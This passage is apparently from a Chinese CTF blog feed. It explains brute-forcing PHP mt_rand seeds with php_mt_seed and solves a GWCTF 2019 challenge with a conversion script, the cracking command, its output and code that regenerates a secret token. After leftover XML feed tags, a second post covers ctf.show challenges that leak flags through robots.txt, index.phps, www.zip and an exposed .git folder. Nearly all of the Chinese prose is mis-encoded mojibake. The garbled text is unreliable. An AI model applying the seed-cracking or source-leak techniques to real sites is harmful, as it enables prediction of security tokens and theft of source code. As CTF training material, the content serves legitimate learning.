<p>æˆ‘ä»¬å·²ç»çŸ¥é“éšæœºæ•°çš„ç”Ÿæˆæ˜¯ä¾èµ–ç‰¹å®šçš„å‡½æ•°ï¼Œä¸Šé¢æ›¾ç»å‡è®¾ä¸º rand &#x3D; seed+(i<em>10) ã€‚å¯¹äºè¿™æ ·ä¸€ä¸ªç®€å•çš„å‡½æ•°ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥ç›´æ¥è®¡ç®—å‡ºä¸€ç»„è§£æ¥ï¼Œä½† mt_rand() å®é™…ä½¿ç”¨çš„å‡½æ•°å¯æ˜¯ç›¸å½“å¤æ‚ä¸”æ— æ³•é€†è¿ç®—çš„ã€‚*<em>æœ‰æ•ˆçš„ç ´è§£æ–¹æ³•å…¶å®æ˜¯ç©·ä¸¾æ‰€æœ‰çš„ç§å­å¹¶æ ¹æ®æšä¸¾å‡ºçš„ç§å­ç”Ÿæˆéšæœºæ•°åºåˆ—å†è·Ÿå·²çŸ¥çš„éšæœºæ•°åºåˆ—åšæ¯”å¯¹æ¥éªŒè¯ç§å­æ˜¯å¦æ­£ç¡®ã€‚php_mt_seedå°±æ˜¯è¿™ä¹ˆä¸€ä¸ªå·¥å…·ï¼Œå®ƒçš„é€Ÿåº¦éå¸¸å¿«ï¼Œè·‘å®Œ2^32ä½seedä¹Ÿå°±å‡ åˆ†é’Ÿã€‚</em></em> å®ƒå¯ä»¥æ ¹æ®å•æ¬¡mt_rand()çš„è¾“å‡ºç»“æœç›´æ¥çˆ†ç ´å‡ºå¯èƒ½çš„ç§å­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çˆ†ç ´ç±»ä¼¼mt_rand(1,100)è¿™æ ·é™å®šäº†MIN MAXè¾“å‡ºçš„ç§å­ã€‚</p>
<p>å¾ˆå¤šå›½å†…å¼€å‘è€…åœ¨ç¨‹åºä¸­ä½¿ç”¨äº†mt_rand()æ¥ç”Ÿæˆå®‰å…¨ä»¤ç‰Œã€æ ¸å¿ƒåŠ è§£å¯†keyç­‰ç­‰å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</p>
<p>ç”¨åˆ°çš„æ˜¯çˆ†ç ´ï¼Œå·²ç»æœ‰å†™å¥½çš„Cè„šæœ¬äº†ã€‚</p>
<p>è¿™é‡Œç®€å•çš„ä»‹ç»ä¸‹è¿™ä¸ªè„šæœ¬å’‹ç”¨</p>
<h3 id="ç§å­çˆ†ç ´å·¥å…·â€”â€”php-mt-seed"><a href="#ç§å­çˆ†ç ´å·¥å…·â€”â€”php-mt-seed" class="headerlink" title="ç§å­çˆ†ç ´å·¥å…·â€”â€”php_mt_seed"></a>ç§å­çˆ†ç ´å·¥å…·â€”â€”php_mt_seed</h3><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.openwall.com/php_mt_seed">http://www.openwall.com/php_mt_seed</a></p>
<p>å®ƒå¯ä»¥æ ¹æ®å•æ¬¡mt_rand()çš„è¾“å‡ºç»“æœç›´æ¥çˆ†ç ´å‡ºå¯èƒ½çš„ç§å­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çˆ†ç ´ç±»ä¼¼mt_rand(1,100)è¿™æ ·é™å®šäº†MIN MAXè¾“å‡ºçš„ç§å­ã€‚</p>
<p>ä¸‹è½½åï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç¼–è¯‘ç”Ÿæˆï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kaliä¸‹ï¼Œè¿›å…¥ç›®å½•ï¼Œmake  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="å…·ä½“ä½¿ç”¨"><a href="#å…·ä½“ä½¿ç”¨" class="headerlink" title="å…·ä½“ä½¿ç”¨"></a>å…·ä½“ä½¿ç”¨</h4><p>php_mt_seedçš„ç”¨æ³•å¯èƒ½å¾ˆç®€å•ï¼Œä¹Ÿå¯èƒ½å¾ˆå¤æ‚ï¼Œå…·ä½“å–å†³äºç”¨ä¾‹çš„è¯¦ç»†ä¿¡æ¯ã€‚è¿™æ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ç”¨æ³•ç¤ºä¾‹ï¼š<br> é¦–å…ˆä½¿ç”¨PHPç”Ÿæˆä¸€ä¸ªâ€œéšæœºâ€æ•°å­—ï¼Œä¾‹å¦‚ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$ php5 <span class="token operator">-</span>r <span class="token string single-quoted-string">'mt_srand(1234567890); echo mt_rand(),"\n";'</span>
<span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ç„¶åè¿è¡Œcrackerï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œåœ¨ä¸ä¸Šé¢ç”¨äºæ„å»ºçš„ç³»ç»Ÿç›¸åŒçš„ç³»ç»Ÿä¸Šï¼‰ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$ time <span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">1328851649</span>
   Pattern<span class="token punctuation">:</span> <span class="token constant">EXACT</span>
   Version<span class="token punctuation">:</span> <span class="token number">3.0</span><span class="token number">.7</span> to <span class="token number">5.2</span><span class="token number">.0</span>
   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0xfc000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">16261.0</span> Mseeds<span class="token operator">/</span>s
   Version<span class="token punctuation">:</span> <span class="token number">5.2</span><span class="token number">.1</span><span class="token operator">+</span>
   Found <span class="token number">0</span><span class="token punctuation">,</span> trying <span class="token number">0x1e000000</span> <span class="token operator">-</span> <span class="token number">0x1fffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.8</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x1fd65f9a</span> <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>
   Found <span class="token number">1</span><span class="token punctuation">,</span> trying <span class="token number">0x26000000</span> <span class="token operator">-</span> <span class="token number">0x27ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x273a3517</span> <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>
   Found <span class="token number">2</span><span class="token punctuation">,</span> trying <span class="token number">0x48000000</span> <span class="token operator">-</span> <span class="token number">0x49ffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">5.2</span><span class="token number">.1</span> to <span class="token number">7.0</span><span class="token operator">.</span>x<span class="token punctuation">;</span> <span class="token constant">HHVM</span><span class="token punctuation">)</span>
   seed <span class="token operator">=</span> <span class="token number">0x499602d2</span> <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span><span class="token constant">PHP</span> <span class="token number">7.1</span><span class="token number">.0</span><span class="token operator">+</span><span class="token punctuation">)</span>
   Found <span class="token number">4</span><span class="token punctuation">,</span> trying <span class="token number">0xfe000000</span> <span class="token operator">-</span> <span class="token number">0xffffffff</span><span class="token punctuation">,</span> speed <span class="token number">91.9</span> Mseeds<span class="token operator">/</span>s
   Found <span class="token number">4</span>
  
   real    <span class="token number">0</span>m47<span class="token operator">.</span><span class="token number">028</span>s
   user    <span class="token number">6</span>m15<span class="token operator">.</span><span class="token number">211</span>s
   sys     <span class="token number">0</span>m0<span class="token operator">.</span><span class="token number">015</span>s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php_mt_seedé¦–å…ˆæœç´¢æ—§ç‰ˆPHP 3.0.7è‡³5.2.0çš„ç§å­ï¼Œé€šå¸¸åªéœ€ä¸€ç§’é’Ÿå³å¯å®Œæˆã€‚ç„¶åï¼Œå®ƒä¼šåŒæ—¶æœç´¢PHP 5.2.1è‡³7.0.xå’ŒPHP 7.1.0+çš„ç§å­ï¼Œè¿™éœ€è¦ä¸€æ®µæ—¶é—´ã€‚</p>
<p>ä¸‹é¢æ¼”ç¤ºä¸€ä¸ªå¤æ‚çš„ç”¨æ³•ç¤ºä¾‹ï¼š<br> php_mt_seed åœ¨å…¶å‘½ä»¤è¡Œä¸Šå¯ä»¥æœ‰1ã€2ã€4æˆ–æ›´å¤šçš„æ•°å­—ã€‚æ•°å­—æŒ‡å®šäº†å¯¹ mt_rand()å‡½æ•°è¾“å‡ºçš„çº¦æŸï¼Œå¦‚mt_rand(0,50)ã€‚</p>
<p>å½“ä»…ä½¿ç”¨ä¸€ä¸ªæ•°å­—è°ƒç”¨æ—¶ï¼Œè¿™æ˜¯mt_randå‡½æ•°çš„ç¬¬ä¸€ä¸ªç”¨æ¥çˆ†ç ´ç§å­çš„è¾“å‡ºã€‚<br> å½“ç”¨2ä¸ªæ•°å­—è°ƒç”¨æ—¶ï¼Œå®ƒä»¬æ˜¯ç¬¬ä¸€ä¸ªmt_rand()çš„è¾“å‡ºåº”è½å…¥çš„èŒƒå›´ï¼ˆæœ€å°å’Œæœ€å¤§ï¼ŒæŒ‰è¯¥é¡ºåºï¼‰ã€‚<br> <strong>å½“ç”¨4ä¸ªæ•°å­—è°ƒç”¨æ—¶ï¼Œå‰2ä¸ªç»™å‡ºç¬¬ä¸€ä¸ªmt_rand()è¾“å‡ºçš„ç•Œé™ï¼Œåä¸¤ä¸ª2ç»™å‡ºä¼ é€’åˆ°mt_rand()çš„èŒƒå›´ã€‚</strong></p>
<h1 id="å®ä¾‹â€”â€”-GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#å®ä¾‹â€”â€”-GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="å®ä¾‹â€”â€”[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>å®ä¾‹â€”â€”[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h1><p>è¿›å…¥é¢˜ç›®<br> <img src="https://img-blog.csdnimg.cn/20200712185058965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æ˜¯ä¸ªçŒœå­—ç¬¦çš„æ¸¸æˆï¼Œå¹¶ä¸”å‘Šè¯‰ä½ äº†ä¸€éƒ¨åˆ†å€¼ï¼š<code>utP4yKDDVV</code>ï¼Œä¼°è®¡æ˜¯å·²çŸ¥äº§ç”Ÿçš„éšæœºæ•°çš„ä¸€éƒ¨åˆ†ã€‚<br> F12 æŸ¥çœ‹æºç ï¼Œå‘ç°check.phpï¼š<br> <img src="https://img-blog.csdnimg.cn/20200712185243498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> è¿›å…¥check.phpï¼Œç»™å‡ºäº†ä½ æºç ï¼š<br> <img src="https://img-blog.csdnimg.cn/20200712185326552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> å¯çŸ¥æºç çš„é€»è¾‘æ˜¯ï¼Œå…ˆäº§ç”Ÿä¸€ä¸ª0åˆ°999999999ä¹‹é—´çš„éšæœºæ•´æ•°ä½œä¸ºéšæœºæ•°ç§å­è¢«mt_srand()å‡½æ•°æ’­ç§ã€‚ç„¶ååœ¨<code>$str_long1</code>è¿™ä¸€é•¿ä¸²å­—ç¬¦ä¸²ä¸­ç”¨mt_rand()æ¥éšæœºå–å‡º20ä¸ªå­—ç¬¦æ„æˆå­—ç¬¦ä¸²<code>$str</code>å¹¶è¾“å‡º<code>$str</code>çš„å‰åä½ç»™ä½ ã€‚æœ€åï¼Œå°†ä½ çŒœçš„è¾“å…¥çš„å€¼æ‹¼ä¸Šç»™ä½ çš„å€¼ä¸<code>$str</code>è¿›è¡Œå¼ºç±»å‹æ¯”è¾ƒï¼Œå¯¹æ¯”æˆåŠŸåˆ™è¿”å›flagã€‚å¯è§ï¼Œå¦‚æœæœ€åèƒ½POSTæ­£ç¡®çš„20ä½ï¼Œè·å¾—flagã€‚é‚£ä¹ˆå…³é”®å°±æ˜¯ï¼Œè¦æ ¹æ®ç»™ä½ çš„10ä½å¯†ç ï¼Œåæ¨å‡ºmt_srandçš„ç§å­æ˜¯ä»€ä¹ˆï¼Œä»è€Œä¾è‘«èŠ¦ç”»ç“¢æ„é€ ç§é’¥ã€‚<br> æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨php_mt_seedå·¥å…·å¯¹éšæœºæ•°ç§å­è¿›è¡Œçˆ†ç ´ã€‚</p>
<p>å…ˆç”¨è„šæœ¬å°†ä¼ªéšæœºæ•°è½¬æ¢æˆphp_mt_seedå¯ä»¥è¯†åˆ«çš„æ•°æ®æ ¼å¼ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">str1<span class="token operator">=</span><span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2<span class="token operator">=</span><span class="token string single-quoted-string">'utP4yKDDVV'</span>
str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token operator">::</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># å€’åº</span>
length <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>
res<span class="token operator">=</span><span class="token string single-quoted-string">''</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j in <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token string single-quoted-string">'0'</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string single-quoted-string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span> res

<span class="token comment">// å‰ä¸¤ä¸ªstr(j)ä»£è¡¨ç¬¬ä¸€ä¸ªmt_rand()è¾“å‡ºçš„ç•Œé™ï¼Œåä¸¤ä¸ªå‚æ•°0å’Œstr(len(str1)-1)è¡¨ç¤ºä¼ é€’åˆ° mt_rand()çš„èŒƒå›´ä¸º0åˆ°61</span>
<span class="token number">12345678910111213</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192116451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> å¾—åˆ°ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°†è¿™ä¸€ä¸²æ‹¿åˆ°å·¥å…·é‡Œå»ä½¿ç”¨<br> çˆ†ç ´å‡ºä¼ªéšæœºæ•°å’Œphpç‰ˆæœ¬</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">.</span><span class="token operator">/</span>php_mt_seed <span class="token number">20</span> <span class="token number">20</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">19</span> <span class="token number">19</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">51</span> <span class="token number">51</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">24</span> <span class="token number">24</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">46</span> <span class="token number">46</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">39</span> <span class="token number">39</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192456776.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> çˆ†ç ´çš„åˆ°ç§å­ä¸ºï¼š206396968ï¼Œå¦‚ä¸‹æ”¹å†™æºç ï¼Œä¾¿å¯ä»¥å¾—åˆ°å®Œæ•´çš„å­—ç¬¦ä¸²</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">206396968</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/20200712192710912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æ‹¿ç€å¾—åˆ°å¾—å­—ç¬¦è½¬æäº¤å³å¯å¾—åˆ°flagï¼š<br> <img src="https://img-blog.csdnimg.cn/20200712192816550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>**ä»¥ä¸Šå†…å®¹æ‘˜è‡ª<a href="https://blog.csdn.net/qq_45521281">WHOAMIAnony</a> **</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf show</title>
    <url>/2022/12/11/ctf-show/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="webå…¥é—¨"><a href="#webå…¥é—¨" class="headerlink" title="webå…¥é—¨"></a>webå…¥é—¨</h1><h2 id="ä¿¡æ¯æœé›†ç¯‡"><a href="#ä¿¡æ¯æœé›†ç¯‡" class="headerlink" title="ä¿¡æ¯æœé›†ç¯‡"></a>ä¿¡æ¯æœé›†ç¯‡</h2><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>é¦–å…ˆçœ‹åˆ°è¿™ä¸ªæç¤ºï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/596f9173f7ed4395b605372b2485798e.png#pic_center" alt="1"></p>
<p>æ‰“å¼€é“¾æ¥ååªæœ‰è¿™ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/1f73d1abe28040d8b6694aac5d241642.png#pic_center" alt="2"></p>
<p>ä¸‹æ„è¯†CTRL+UæŸ¥çœ‹æºç ï¼Œæ²¡æœ‰ä¿¡æ¯ã€‚</p>
<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿé¡¹ç›®é™æ€æ–‡ä»¶robots.txtçš„å†…å®¹ï¼Œä¸€äº›é¡¹ç›®robots.txtä¼šå­˜æ”¾äºé¡µé¢<a href="https://so.csdn.net/so/search?q=%E6%A0%B9%E7%9B%AE%E5%BD%95&spm=1001.2101.3001.7020">æ ¹ç›®å½•</a>ã€‚é‡Œé¢åŒ…å«ä¸€äº›é‡è¦ä¿¡æ¯ã€‚å› æ­¤æˆ‘ä»¬å°è¯•åœ¨ç½‘å€åé¢æ·»åŠ &#x2F;robots.txtã€‚ç»“æœæœ‰äº†æ–°çš„å‘ç°ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/f67302ed82a940179b4af7082c8b1c2a.png#pic_center" alt="3"></p>
<p>æˆ‘ä»¬åœ¨ç½‘å€åé¢åŠ ä¸Š&#x2F;flagishere.txtï¼Œflagæ˜¾ç°ã€‚</p>
<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>æœ‰æç¤ºï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/a501687594b2446a8c353d48ff9ac942.png#pic_center" alt="4"></p>
<p>phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰ç›´æ¥é€šè¿‡Webæµè§ˆå™¨æŸ¥çœ‹phpä»£ç çš„å†…å®¹ã€‚</p>
<p>æ‰“å¼€é“¾æ¥ï¼Œæˆ‘æ˜¯å…ˆæŠ“åŒ…ï¼Œrepeateråçœ‹åˆ°æ˜¯ç”¨phpè¯­è¨€ç¼–å†™çš„ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/b51eee7ec5e64148b8010a113ee635ae.png#pic_center" alt="6"></p>
<p>å…¶ä¸»é¡µæ–‡ä»¶åº”è¯¥æ˜¯<strong>ï¼šindex.php</strong>ï¼Œè®¿é—®çœ‹çœ‹ï¼Œæ²¡æ˜¾ç¤ºã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/82eb6e04e80f47699c17d354a8ab970d.png#pic_center" alt="5"></p>
<p>è®¿é—®ï¼š**&#x2F;index.phps**ä¸‹è½½æ–‡ä»¶æŸ¥çœ‹ï¼Œå¾—åˆ°flagã€‚</p>
<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>å®˜æ–¹æç¤ºï¼šè§£å‹æºç åˆ°å½“å‰ç›®å½•ï¼Œæµ‹è¯•æ­£å¸¸ï¼Œæ”¶å·¥</p>
<p>è¯´æ˜æºç è§£å‹åˆ°å½“å‰ç›®å½•åï¼Œäº§å“å°±ä¸Šçº¿äº†ï¼Œæºç çš„å‹ç¼©åŒ…æ²¡æœ‰åˆ é™¤ï¼Œå¯¼è‡´å¯ä»¥è¢«ä¸‹è½½</p>
<p>ä¸€èˆ¬å¼€å‘çš„æºç å‹ç¼©åŒ…åå­—éƒ½æ˜¯w w w.zip</p>
<p><img src="https://img-blog.csdnimg.cn/27bf54b0ccb4478d94089ce1a2c99afd.png#pic_center" alt="7"></p>
<p>æ‰€ä»¥è®¿é—®ä¸‹è½½åˆ°è¿™ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°flagã€‚</p>
<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>å®˜æ–¹æç¤ºï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼Œä½†ä¸è¦éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒæ›´é‡è¦ã€‚</p>
<p>ç‰ˆæœ¬æ§åˆ¶å¸¸ç”¨ä¸¤ç§è½¯ä»¶ï¼Œä¸€ç§æ˜¯gitï¼Œä¸€ç§æ˜¯svnï¼Œç‰ˆæœ¬æ§åˆ¶æ³„éœ²å°±æ˜¯å°†.gitæ–‡ä»¶å¤¹æˆ–è€….svnæ–‡ä»¶å¤¹ä¹Ÿéƒ¨ç½²åˆ°ç½‘ç«™ä¸Šäº†ï¼Œå¦‚æœåˆ«äººè®¿é—®url&#x2F;.gitå°±å¯ä»¥è®¿é—®åˆ°ã€‚</p>
<p>è¯•ç€è®¿é—®&#x2F;.gitå’Œ&#x2F;.svnï¼Œå‘ç°è®¿é—®&#x2F;.gitå‡ºç°flagã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/c71171b9596a457a9de2f33409e5020f.png#pic_center" alt="8"></p>
<p><img src="https://img-blog.csdnimg.cn/f99e0efe08b94cffa35fb0b89c67f324.png#pic_center" alt="9"></p>
